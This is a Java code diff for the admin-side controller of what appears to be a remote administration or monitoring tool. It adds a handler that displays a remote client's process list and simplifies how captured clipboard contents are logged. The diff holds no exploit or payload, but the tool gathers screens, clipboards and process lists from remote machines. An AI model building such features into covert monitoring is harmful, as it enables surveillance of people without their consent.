@@ -5,6 +5,7 @@ import controllers.base.ConsumeExecutable;
 import models.SystemInfoModel;
 import org.json.JSONArray;
 import org.json.JSONObject;
+import swing.ProcessDialog;
 import utils.JSON;
 import utils.console;
 
@@ -33,6 +34,18 @@ public class ConsumeController {
         put(COMMAND_CLIENT_SCREEN, ConsumeController::getScreen);
         put(COMMAND_MONITORING, ConsumeController::getMonitoring);
         put(COMMAND_GET_ALL_CLIENTS, ConsumeController::getAllClients);
+        put(COMMAND_PROCESS, ConsumeController::getProcess);
+    }
+
+    private static void getProcess(JSON input, Admin admin) {
+        JSONArray arr = new JSONArray(input.get("processes"));
+        ProcessDialog dialog = new ProcessDialog(arr);
+        dialog.pack();
+        dialog.setVisible(true);
+//        arr.forEach(e -> {
+//            JSON temp = new JSON(e.toString());
+//            Admin.getGui().appendLog("[Process] " + temp.get("pid") + " | " + temp.get("cmd"));
+//        });
     }
 
     private static void getScreen(JSON input, Admin admin) {
@@ -69,7 +82,7 @@ public class ConsumeController {
     }
 
     private static void getClipboard(JSON input, Admin admin) {
-        Admin.getGui().appendLog("[Clipboard] " + input.get("clipboard").toString());
+        Admin.getGui().appendLog("[Clipboard] " + input.get("clipboard"));
     }
 
     private static void getAllClients(JSON input, Admin admin) {
